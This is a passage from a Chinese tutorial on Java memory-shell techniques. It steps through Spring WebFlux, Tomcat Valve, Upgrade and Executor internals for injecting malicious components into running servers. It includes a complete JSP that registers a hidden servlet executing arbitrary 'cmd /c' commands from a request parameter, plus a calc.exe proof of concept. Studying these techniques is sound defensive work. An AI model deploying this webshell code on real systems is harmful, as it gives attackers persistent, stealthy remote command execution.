可以看到是调用了invokeFilter函数。我们仔细看看这个DefaultWebFilterChain类： 可以看到是有三个名为DefaultWebFilterChain的函数，其中第一个是公共构造函数，第二个是私有构造函数（用来创建chain的中间节点），第三个是已经过时的构造函数。而在该类的注释中，有这样一句话： Each instance of this class represents one link in the chain. The public constructor DefaultWebFilterChain(WebHandler, List) initializes the full chain and represents its first link. 也就是说，通过调用 DefaultWebFilterChain 类的公共构造函数，我们初始化了一个完整的过滤器链，其中的每个实例都代表链中的一个link，而不是一个chain，这就意味着我们无法通过修改下图中的chain.allFilters来实现新增Filter： 但是这个类里面有个initChain方法用来初始化过滤器链，这个方法里面调用的是这个私有构造方法： 那我们就看看这个公共构造方法是在哪里调用的： 光标移至该方法，按两下Ctrl+Alt+F7： 调用的地方位于org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler： 那思路就来了，我们只需要构造一个DefaultWebFilterChain对象，，然后把它通过反射写入到FilteringWebHandler类对象的chain属性中就可以了。 那现在就剩下传入handler和filters这两个参数了，这个handler参数很好搞，就在chain里面： 然后这个filters的话，我们可以先获取到它本来的filters，然后把我们自己写的恶意filter放进去，放到第一位，就可以了。 那现在就是从内存中找到DefaultWebFilterChain的位置，然后一步步反射就行。这里直接使用工具https://github.com/c0ny1/java-object-searcher，克隆下来该项目，放到idea中mvn clean install： 然后把生成的这个java-object-searcher-0.1.0.jar放到我们的WebFluxMemoryShellDemo项目的Project Structure中的Libraries中： 然后我们把我们的GreetingFilter.java的代码修改成下面的： 123456789101112131415161718192021222324252627282930313233343536373839package org.example.webfluxmemoryshelldemo.hello;import org.springframework.http.server.reactive.ServerHttpRequest;import org.springframework.stereotype.Component;import org.springframework.web.server.ServerWebExchange;import org.springframework.web.server.WebFilter;import org.springframework.web.server.WebFilterChain;import org.springframework.web.util.pattern.PathPattern;import org.springframework.web.util.pattern.PathPatternParser;import reactor.core.publisher.Mono;import me.gv7.tools.josearcher.entity.Blacklist;import me.gv7.tools.josearcher.entity.Keyword;import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;import java.util.ArrayList;import java.util.List;@Componentpublic class GreetingFilter implements WebFilter &#123; @Override public Mono&lt;Void&gt; filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) &#123; PathPattern pattern=new PathPatternParser().parse(&quot;/hello/**&quot;); ServerHttpRequest request=serverWebExchange.getRequest(); if (pattern.matches(request.getPath().pathWithinApplication()))&#123; System.out.println(&quot;hello, this is our GreetingFilter!&quot;); &#125; List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;(); keys.add(new Keyword.Builder().setField_type(&quot;DefaultWebFilterChain&quot;).build()); List&lt;Blacklist&gt; blacklists = new ArrayList&lt;&gt;(); blacklists.add(new Blacklist.Builder().setField_type(&quot;java.io.File&quot;).build()); SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys); searcher.setBlacklists(blacklists); searcher.setIs_debug(true); searcher.setMax_search_depth(10); searcher.setReport_save_path(&quot;D:\\\\javaSecEnv\\\\apache-tomcat-9.0.85\\\\bin&quot;); searcher.searchObject(); return webFilterChain.filter(serverWebExchange); &#125;&#125; 这里我们设置的关键字是DefaultWebFilterChain，然后直接运行： 也就是说，位置是在： 1234567891011TargetObject = &#123;reactor.netty.resources.DefaultLoopResources$EventLoop&#125; ---&gt; group = &#123;java.lang.ThreadGroup&#125; ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; ---&gt; [3] = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$1&#125; ---&gt; this$0 = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer&#125; ---&gt; handler = &#123;org.springframework.http.server.reactive.ReactorHttpHandlerAdapter&#125; ---&gt; httpHandler = &#123;org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler&#125; ---&gt; delegate = &#123;org.springframework.web.server.adapter.HttpWebHandlerAdapter&#125; ---&gt; delegate = &#123;org.springframework.web.server.handler.ExceptionHandlingWebHandler&#125; ---&gt; delegate = &#123;org.springframework.web.server.handler.FilteringWebHandler&#125; ---&gt; chain = &#123;org.springframework.web.server.handler.DefaultWebFilterChain&#125; 2.13 Tomcat Valve介绍与运行过程分析2.13.1 Valve与Pipeline在众多文章里面，下面的这篇我觉得是讲的最通俗易懂的，这里推荐给大家： https://www.cnblogs.com/coldridgeValley/p/5816414.html 这里我组合引用原文，做了适当的修改，概括一下： tomcat中的Container有4种，分别是Engine、Host、Context和Wrapper，这4个Container的实现类分别是StandardEngine、StandardHost、StandardContext和StandardWrapper。4种容器的关系是包含关系，Engine包含Host，Host包含Context，Context包含Wrapper，Wrapper则代表最基础的一个Servlet。tomcat由Connector和Container两部分组成，而当网络请求过来的时候Connector先将请求包装为Request，然后将Request交由Container进行处理，最终返回给请求方。而Container处理的第一层就是Engine容器，但是在tomcat中Engine容器不会直接调用Host容器去处理请求，那么请求是怎么在4个容器中流转的，4个容器之间是怎么依次调用的呢？ 原来，当请求到达Engine容器的时候，Engine并非是直接调用对应的Host去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做pipeline组件，跟pipeline相关的还有个也是容器内部的组件，叫做valve组件。 Pipeline的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么pipeline就可以理解为不同容器之间的管道，道路，桥梁。那Valve这个组件是什么东西呢？Valve也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，Pipeline和Valve关系也是一样的。Valve代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把Pipeline比作公路的话，那么Valve可以理解为公路上的收费站，车代表Pipeline中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。 在Catalina中，4种容器都有自己的Pipeline组件，每个Pipeline组件上至少会设定一个Valve，这个Valve我们称之为BaseValve，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。 Pipeline定义对应的接口Pipeline，标准实现了StandardPipeline。Valve定义对应的接口Valve，抽象实现类ValveBase，4个容器对应基础阀门分别是StandardEngineValve，StandardHostValve，StandardContextValve，StandardWrapperValve。在实际运行中，Pipeline和Valve运行机制如下图： 这张图是新加坡的Dennis Jacob在ApacheCON Asia 2022上的演讲《Extending Valves in Tomcat》中的PPT中的图片，pdf链接如下： https://people.apache.org/~huxing/acasia2022/Dennis-Jacob-Extending-Valves-in-Tomcat.pdf 这篇演讲的录屏在Youtube上面可以找到： https://www.youtube.com/watch?v=Jmw-d0kyZ_4 2.13.2 编写一个简单Tomcat Valve的demo由于在Tomcat环境下使用Valve还要配置web.xml，我嫌麻烦，于是直接使用SpringBoot来搭建。记得这里勾选的是Spring Web： 然后创建test目录并在test目录下创建两个文件，TestValve.java： 1234567891011121314151617package org.example.valvememoryshelldemo.test;import java.io.IOException;import org.apache.catalina.connector.Request;import org.apache.catalina.connector.Response;import org.apache.catalina.valves.ValveBase;import org.springframework.stereotype.Component;@Componentpublic class TestValve extends ValveBase &#123; @Override public void invoke(Request request, Response response) throws IOException &#123; response.setContentType(&quot;text/plain&quot;); response.setCharacterEncoding(&quot;UTF-8&quot;); response.getWriter().write(&quot;Valve 被成功调用&quot;); &#125;&#125; 还有TestConfig.java： 12345678910111213141516171819202122package org.example.valvememoryshelldemo.test;import org.apache.catalina.Valve;import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;import org.springframework.boot.web.server.WebServerFactoryCustomizer;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class TestConfig &#123; @Bean public WebServerFactoryCustomizer&lt;TomcatServletWebServerFactory&gt; tomcatCustomizer() &#123; return factory -&gt; &#123; factory.addContextValves(getTestValve()); &#125;; &#125; @Bean public Valve getTestValve() &#123; return new TestValve(); &#125;&#125; 运行效果如下： 2.13.3 Tomcat Valve打入内存马思路分析我们通常情况下用的都是ValveBase，点进这个ValveBase，可以看到是实现了Valve接口： 点进valve可以看到该接口代码如下，这里我加上了注释： 1234567891011121314151617181920package org.apache.catalina;import java.io.IOException;import javax.servlet.ServletException;import org.apache.catalina.connector.Request;import org.apache.catalina.connector.Response;public interface Valve &#123; // 获取下一个阀门 public Valve getNext(); // 设置下一个阀门 public void setNext(Valve valve); // 后台执行逻辑，主要在类加载上下文中使用到 public void backgroundProcess(); // 执行业务逻辑 public void invoke(Request request, Response response) throws IOException, ServletException; // 是否异步执行 public boolean isAsyncSupported();&#125; 接下来就是调试看看这个valve的运行流程了，我们在invoke函数这里下断点调试： 我们看向左下角，看看之前调用到的invoke方法： 在StandardHostValve.java中，代码为： 1context.getPipeline().getFirst().invoke(request, response); 在StandardEngineValve.java中，代码为： 1host.getPipeline().getFirst().invoke(request, response); 之后的诸如Http11Processor.java和多线程的部分就不需要我们关注了。既然我们的目的是打入内存马，那根据我们掌握的Tomcat Servlet/Filter/Listener内存马的思路来看，我们需要通过某种方式添加我们自己的恶意valve。 我们去掉之前打的断点，在StandardHostValve.java这里打上断电并重新调试： 然后step into： 鼠标左键单击这里的getPipeline即可进入到所调用的函数实现的位置： 再Ctrl+H进入Pipeline接口，可以看到是有个addValve方法： 这不正是我们需要的吗？我们去看看它是在哪儿实现的，直接在addValve函数处Ctrl+H找继承该接口的类，可可以看到是在org.apache.catalina.core.StandardPipeline中： 但是问题就来了，我们无法直接获取到这个StandardPipeline，而我们能直接获取到的是StandardContext，那就去看看StandardContext.java中有没有获取StandardPipeline的方法。 一眼就能看到我们的老熟人——getPipeline方法： 那这样以来我们的思路就可以补充完整了，先反射获取StandardContext，然后编写一个恶意Valve，最后通过StandardContext.getPipeline().addValve()添加就可以了。当然，我们也可以反射获取StandardPipeline，然后再addValve，这样也是可以的。 2.14 Tomcat Upgrade介绍与打入内存马思路分析2.14.1 编写一个简单的Tomcat Upgrade的demo2.14.1.1 利用SpringBoot搭建我这里在之前的Tomcat Valve项目的基础上做了简单的修改，删除之前test目录下的TestValve.java，新建一个TestUpgrade.java： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package org.example.valvememoryshelldemo.test;import org.apache.coyote.*;import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;import org.apache.tomcat.util.net.SocketWrapperBase;import org.springframework.context.annotation.Configuration;import java.lang.reflect.Field;import java.nio.ByteBuffer;@Configurationpublic class TestUpgrade implements UpgradeProtocol &#123; @Override public String getHttpUpgradeName(boolean b) &#123; return &quot;hello&quot;; &#125; @Override public byte[] getAlpnIdentifier() &#123; return new byte[0]; &#125; @Override public String getAlpnName() &#123; return null; &#125; @Override public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) &#123; return null; &#125; @Override public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter, Request request) &#123; return null; &#125; public boolean accept(org.apache.coyote.Request request) &#123; try &#123; Field response = org.apache.coyote.Request.class.getDeclaredField(&quot;response&quot;); response.setAccessible(true); Response resp = (Response) response.get(request); resp.doWrite(ByteBuffer.wrap(&quot;\\n\\nHello, this my test Upgrade!\\n\\n&quot;.getBytes())); &#125; catch (Exception ignored) &#123;&#125; return false; &#125;&#125; 然后修改TestConfig.java如下： 12345678910111213141516package org.example.valvememoryshelldemo.test;import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;import org.springframework.boot.web.server.WebServerFactoryCustomizer;import org.springframework.stereotype.Component;@Componentpublic class TestConfig implements WebServerFactoryCustomizer&lt;TomcatServletWebServerFactory&gt; &#123; @Override public void customize(TomcatServletWebServerFactory factory) &#123; factory.addConnectorCustomizers(connector -&gt; &#123; connector.addUpgradeProtocol(new TestUpgrade()); &#125;); &#125;&#125; 运行之后命令行执行命令curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; http://localhost:8080，效果如下： 2.14.1.2 利用Tomcat搭建当然也是可以利用Tomcat来搭建的，只需要TestUpgrade.java即可，因为里面含有定义的servlet逻辑： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package org.example;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.catalina.connector.RequestFacade;import org.apache.catalina.connector.Request;import org.apache.coyote.Adapter;import org.apache.coyote.Processor;import org.apache.coyote.UpgradeProtocol;import org.apache.coyote.Response;import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;import org.apache.tomcat.util.net.SocketWrapperBase;import java.lang.reflect.Field;import java.nio.ByteBuffer;@WebServlet(&quot;/evil&quot;)public class TestUpgrade extends HttpServlet &#123; static class MyUpgrade implements UpgradeProtocol &#123; @Override public String getHttpUpgradeName(boolean b) &#123; return null; &#125; @Override public byte[] getAlpnIdentifier() &#123; return new byte[0]; &#125; @Override public String getAlpnName() &#123; return null; &#125; @Override public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) &#123; return null; &#125; @Override public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) &#123; return null; &#125; @Override public boolean accept(org.apache.coyote.Request request) &#123; try &#123; Field response = org.apache.coyote.Request.class.getDeclaredField(&quot;response&quot;); response.setAccessible(true); Response resp = (Response) response.get(request); resp.doWrite(ByteBuffer.wrap(&quot;Hello, this my test Upgrade!&quot;.getBytes())); &#125; catch (Exception ignored) &#123;&#125; return false; &#125; &#125; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) &#123; try &#123; RequestFacade rf = (RequestFacade) req; Field requestField = RequestFacade.class.getDeclaredField(&quot;request&quot;); requestField.setAccessible(true); Request request1 = (Request) requestField.get(rf); new MyUpgrade().accept(request1.getCoyoteRequest()); &#125; catch (Exception ignored) &#123;&#125; &#125;&#125; 效果如下： 2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析这部分主要参考了Sndav师傅的文章（原文地址为https://tttang.com/archive/1709/，但是由于图片链接挂掉导致图片无法显示，我们可以访问如下地址查看：https://web.archive.org/web/20220823040415/https://tttang.com/archive/1709/）以及p4d0rn师傅的文章（https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade）。 和之前所提到的Spring Interceptor型内存马有点类似，在渗透过程中，尽管我们打入了内存马，但是因为原有的Filter包含鉴权或者其他功能，可能会导致我们的内存马无法访问，或者因为反向代理而导致我们无法找到对应的路径，这就需要我们在到Filter这一步之前就得打入内存马。 这里，我引用码哥字节文章（https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09）里面的一张Tomcat架构图： 可以清楚地看到，在此之前还有Executor和Processor两个模块，本节内容主要讨论后者，在下节中我们会讨论前者。 这一部分需要更加完备的Tomcat的相关知识，不再满足于之前的四个容器，关于这些基础知识的学习，强烈建议看码哥字节的文章，写的确实特别的好： https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09 其实在之前学习Tomcat Valve的过程中，当时我是一步步step over跟完了所有的代码的，我当时也提了一嘴Http11Processor。我们还是以当时的项目为例来看。 我们还是在StandardHostValve.java的这行打上断点： 从上面我红色箭头所指出的地方就可以看到调用到了process函数，具体调用位置位于org.apache.coyote.AbstractProcessorLight#process，我们跟过去看看： 可以看到，如果当前SocketWrapperBase的状态是OPEN_READ的时候，才会调用对应的processor去处理（第二张图的process调用的位置可以通过第一张图左下角的那个process的后一个process点进去看到）： 我们继续step into这里的service方法看看： 继续step over，可以看到这里在检查header中的Connection头中是否为upgrade，这一点可以通过step into这个isConnectionToken方法看到： 之后干两件事情：一是调用getUpgradeProtocol方法根据upgradedName从httpUpgradeProtocols拿到UpgradeProtocol；二是调用UpgradeProtocol对象的accept方法： 到了这里，我们似乎可以建立起一个猜想，和之前介绍的内存马类似，我们只要构造一个恶意的UpgradeProtocol，然后把它插入到httpUpgradeProtocols。 由于httpUpgradeProtocols是一个hashmap，那么向里面添加的话用到的肯定是put方法，直接搜httpUpgradeProtocols.put： 我们在这行打上断点，然后调试，发现在我们没有执行curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; http://localhost:8080这条命令之前，断点就到了，也就是说，httpUpgradeProtocols.put这个事情是发生在tomcat启动的时候的。 那这样一来，思路就更加具体了一点：反射找到httpUpgradeProtocols，把恶意upgradeProtocol插入进去即可构成upgrade内存马，思路和之前是一模一样的。 那现在只需要解决最后一个问题——如何找到httpUpgradeProtocols的位置。我们打开之前用tomcat搭建的Tomcat Upgrade的demo，在如下位置打下断点，然后执行命令curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; http://localhost:8080/evil进入断点调试：： step over一步即可在下方看到request1属性： 然后在request1里面的connector的protocolHandler里面发现了httpUpgradeProtocols： 接下来就是一步步地反射了。 2.15 Tomcat Executor内存马介绍与打入内存马思路分析2.15.1新建一个项目，配置好tomcat运行环境和web目录，然后新建以下两个文件，第一个是TestExecutor.java： 1234567891011121314151617181920212223package org.example;import java.io.IOException;import java.util.concurrent.SynchronousQueue;import java.util.concurrent.ThreadPoolExecutor;import java.util.concurrent.TimeUnit;public class TestExecutor extends ThreadPoolExecutor &#123; public TestExecutor() &#123; super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;&gt;()); &#125; @Override public void execute(Runnable command) &#123; try &#123; Runtime.getRuntime().exec(&quot;calc.exe&quot;); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; super.execute(command); &#125;&#125; 第二个是TestServlet.java： 123456789101112131415161718package org.example;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@WebServlet(&quot;/test&quot;)public class TestServlet extends HttpServlet &#123; TestExecutor executor = new TestExecutor(); @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) &#123; executor.execute(() -&gt; &#123; System.out.println(&quot;Execute method triggered by accessing /test&quot;); &#125;); &#125;&#125; 然后访问浏览器对应context下的test路由： 2.15.2 Tomcat Executor内存马介绍与代码调试分析在2.14.2节中，我们聊到过可以在Executor模块中打入内存马，本节就来分析具体流程。本节主要参考文章为以下四篇： https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor https://cjlusec.ldxk.edu.cn/2023/02/15/Executor/ https://xz.aliyun.com/t/11593 https://xz.aliyun.com/t/11613 在我之前提到过的讲tomcat架构的基础文章（https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09），有详细地讲述ProtocolHandler组件中的EndPoint部件，如果之前没有看完整地可以再去看下。里面这张图画的很好，我这里作引用： 2.15.2.1 Endpoint五大组件如下表所示： 组件 描述 LimitLatch 连接控制器，控制最大连接数 Acceptor 接收新连接并返回给Poller的Channel对象 Poller 监控Channel状态，类似于NIO中的Selector SocketProcessor 封装的任务类，处理连接的具体操作 Executor Tomcat自定义线程池，用于执行任务类 2.15.2.2 Endpoint分类EndPoint接口的具体实现类为AbstractEndpoint，AbstractEndpoint具体的实现类有AprEndpoint、Nio2Endpoint、NioEndpoint： Endpoint 简要解释 Tomcat 源码位置 AprEndpoint 使用APR模式解决异步IO问题，提高性能 org.apache.tomcat.util.net.AprEndpoint Nio2Endpoint 使用代码实现异步IO org.apache.tomcat.util.net.Nio2Endpoint NioEndpoint 使用Java NIO实现非阻塞IO org.apache.tomcat.util.net.NioEndpoint 上面所提到的tomcat，指的是如下pom依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-coyote&lt;/artifactId&gt; &lt;version&gt;9.0.83&lt;/version&gt;&lt;/dependency&gt; Tomcat默认启动是以NioEndpoint来启动的，它是Tomcat中默认的负责使用NIO方式进行网络通信功能的模块，它负责监听处理请求连接，并将解析出的字节流传递给Processor进行后续的处理。 2.15.2.3 Executor相关代码分析点开Executor.java即可看到有一个execute方法： Ctrl+Alt+F7追踪即可看到这个Executor接口在AbstractEndpoint这个抽象类中有相关实现： 在AbstractEndpoint.java中搜索executor，往下翻即可看到有setExecutor和getExecutor这两个函数： 查看getExecutor函数的调用位置，发现就在该文件中有一个关键调用： 跟过去： 从下面这篇文章中我们可以知道processSocket在Tomcat运行过程中的作用： https://blog.51cto.com/u_8958931/2817418 那此时我们就有一个想法，如果我能控制executor，我把原来的executor通过setExecutor变成我恶意创建的executor，然后再通过这后面的executor.execute（org.apache.tomcat.util.threads.ThreadPoolExecutor#execute(java.lang.Runnable)）一执行就可以加载我们的恶意逻辑了。 但是现在有一个很头疼的问题，那就是标准的ServletRequest需要经过Adapter的封装后才可获得，这里还在Endpoint阶段，其后面封装的ServletRequest和ServletResponse无法直接获取。 那怎么办呢？结合之前学过的知识，我们很容易想到在之前我们第一次接触java-object-researcher的时候，c0ny1师傅写的这篇文章： http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/ 那就试试看呗，我们导入jar包到项目之后修改TestServlet.java代码如下： 123456789101112131415161718192021222324252627282930313233package org.example;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import me.gv7.tools.josearcher.entity.Blacklist;import me.gv7.tools.josearcher.entity.Keyword;import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;import java.util.ArrayList;import java.util.List;@WebServlet(&quot;/test&quot;)public class TestServlet extends HttpServlet &#123; TestExecutor executor = new TestExecutor(); @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) &#123; executor.execute(() -&gt; &#123; System.out.println(&quot;Execute method triggered by accessing /test&quot;); &#125;); List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;(); keys.add(new Keyword.Builder().setField_type(&quot;request&quot;).build()); List&lt;Blacklist&gt; blacklists = new ArrayList&lt;&gt;(); blacklists.add(new Blacklist.Builder().setField_type(&quot;java.io.File&quot;).build()); SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys); searcher.setBlacklists(blacklists); searcher.setIs_debug(true); searcher.setMax_search_depth(10); searcher.setReport_save_path(&quot;D:\\\\javaSecEnv\\\\apache-tomcat-9.0.85\\\\bin&quot;); searcher.searchObject(); &#125;&#125; 接着访问路由，然后在控制台输出中搜索request = ： 直接搜索到了这条链： 1234567891011TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125; ---&gt; group = &#123;java.lang.ThreadGroup&#125; ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; ---&gt; [15] = &#123;java.lang.Thread&#125; ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint$Poller&#125; ---&gt; this$0 = &#123;org.apache.tomcat.util.net.NioEndpoint&#125; ---&gt; connections = &#123;java.util.Map&lt;U, org.apache.tomcat.util.net.SocketWrapperBase&lt;S&gt;&gt;&#125; ---&gt; [java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8080 remote=/0:0:0:0:0:0:0:1:10770]] = &#123;org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper&#125; ---&gt; socket = &#123;org.apache.tomcat.util.net.NioChannel&#125; ---&gt; appReadBufHandler = &#123;org.apache.coyote.http11.Http11InputBuffer&#125; ---&gt; request = &#123;org.apache.coyote.Request&#125; 我们来验证一下，在org/apache/tomcat/util/net/NioEndpoint.java的这里下断点，不断step over，就可以找到这里的request的位置： 点开这里的byteBuffer，可以看到它是一个字节数组，右键找到View as ... String即可变成字符串： 再点击上面我指出来的View Text即可清楚看到具体内容： 这就意味着我们可以把命令作为header的一部分传入，再把结果作为header的一部分传出即可。 三、传统Web型内存马3.1 Servlet内存马3.1.1 简单的servlet内存马demo编写根据我们在上面的2.3节中的分析可以得出以下结论： 如果我们想要写一个Servlet内存马，需要经过以下步骤： 找到StandardContext 继承并编写一个恶意servlet 创建Wapper对象 设置Servlet的LoadOnStartUp的值 设置Servlet的Name 设置Servlet对应的Class 将Servlet添加到context的children中 将url路径和servlet类做映射 由以上结论我们可以写出如下内存马demo： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.Servlet&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.ServletConfig&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.ServletContext&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.ServletRequest&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.ServletResponse&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;% try &#123; ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); String servletURL = &quot;/&quot; + getRandomString(); String servletName = &quot;Servlet&quot; + getRandomString(); Servlet servlet = new Servlet() &#123; @Override public void init(ServletConfig servletConfig) &#123;&#125; @Override public ServletConfig getServletConfig() &#123; return null; &#125; @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException &#123; String cmd = servletRequest.getParameter(&quot;cmd&quot;); &#123; InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot; + cmd).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; servletResponse.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); &#125; &#125; @Override public String getServletInfo() &#123; return null; &#125; @Override public void destroy() &#123; &#125; &#125;; Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(servletName); wrapper.setServlet(servlet); wrapper.setServletClass(servlet.getClass().getName()); wrapper.setLoadOnStartup(1); standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(servletURL, servletName); response.getWriter().write(&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot; + servletURL + &quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot; + servletName + &quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot; + servletURL + &quot;?cmd=echo 世界，你好！&quot;); &#125; catch (Exception e) &#123; String errorMessage = e.getMessage(); response.setCharacterEncoding(&quot;UTF-8&quot;); PrintWriter outError = response.getWriter(); outError.println(&quot;Error: &quot; + errorMessage); outError.flush(); outError.close(); &#125;%&gt;&lt;/body&gt;&lt;/html&gt;&lt;%! private String getRandomString() &#123; String characters = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; StringBuilder randomString = new StringBuilder(); for (int i = 0; i &lt; 8; i++) &#123; int index = (int) (Math.random() * characters.length()); randomString.append(characters.charAt(index)); &#125; return randomString.toString(); &#125;%&gt; 访问，执行任意命令： 3.1.2 servlet内存马demo代码分析先完成第一个任务：找到StandardContext，代码如下： 1234567ServletContext servletContext = request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 首先得知道Field是什么。在Java中，Field这个类属于java.lang.reflect包，用于表示类的成员变量（字段）。Field类提供了访问和操作类的字段的方法，包括获取字段的名称、类型、修饰符等信息，以及在实例上获取或设置字段的值。这样我们就可以实现在运行时动态获取类的信息，绕过一些访问修饰符的限制，访问和操作类的私有成员。 所以上述代码的含义就是：从当前HttpServletRequest中获取ServletContext对象，然后使用反射机制获取ServletContext类中名为context的私有字段，并赋值给Field类型的变量appctx，把这个变量的属性设置为可访问，这样我们后续可以通过反射获取它的值。接着通过反射获取ServletContext对象的私有字段context的值，并将其强制类型转换为ApplicationContext。接下来继续使用反射机制获取ApplicationContext类中名为context的私有字段，并赋值给Field类型的变量stdctx，同样将其设置为可访问；最后通过反射获取ApplicationContext对象的私有字段context的值，并将其强制类型转换为StandardContext，到这里，我们就成功找到了StandardContext。 接着完成第二个任务：继承并编写一个恶意servlet，代码如下： 1234567891011121314151617181920212223242526272829Servlet servlet = new Servlet() &#123; @Override public void init(ServletConfig servletConfig) &#123;&#125; @Override public ServletConfig getServletConfig() &#123; return null; &#125; @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException &#123; String cmd = servletRequest.getParameter(&quot;cmd&quot;); &#123; InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot; + 